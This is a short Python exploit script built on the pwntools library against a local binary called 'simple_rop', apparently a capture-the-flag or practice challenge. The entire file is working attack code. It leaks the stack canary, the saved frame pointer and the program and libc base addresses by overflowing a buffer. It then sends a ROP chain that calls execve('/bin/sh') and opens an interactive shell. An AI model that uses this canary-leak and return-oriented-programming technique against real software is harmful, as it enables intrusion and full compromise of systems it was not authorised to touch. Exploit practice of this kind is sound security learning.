from pwn import *

context.arch = 'amd64'

p = process('./simple_rop')

#context.terminal = ["alacritty", "-e", "bash", "-c"]
#gdb.attach(p)

def leak(off, size):
    if size <= 0:
        return b''
    p.sendline(off*b'A')
    ans = p.recvline()
    assert ans[-1] == ord(b'\n')
    ans = ans[:-1]
    value = ans[off:off+size]
    if len(value) < size:
        value += b'\x00'
    off += len(value)
    size -= len(value)
    return value + leak(off, size)

leaked_canary = u64(leak(0x28, 8))
print('leaked_canary', hex(leaked_canary))

leaked_rbp = u64(leak(0x30, 8))
print('leaked_rbp', hex(leaked_rbp))

leaked_129C = u64(leak(0x38, 8))
base_prog = leaked_129C - 0x129C

print('base_prog', hex(base_prog))

leaked_libc_25E08 = u64(leak(0x38+8+8+8+8, 8))
base_libc = leaked_libc_25E08 - 0x25E08

print('base_libc', hex(base_libc))

elf = ELF('libc.so.6')
elf.address = base_libc
rop = ROP(elf, base=leaked_rbp-0x18)

bin_sh = list(elf.search(b'/bin/sh'))
bin_sh = bin_sh[0]
print('bin_sh', hex(bin_sh))

rop.execve(b'/bin/sh')

print(rop.dump())

p.sendline(0x28*b'A' + p64(leaked_canary) + p64(leaked_rbp) + rop.chain())
p.sendline(b'')

p.interactive()
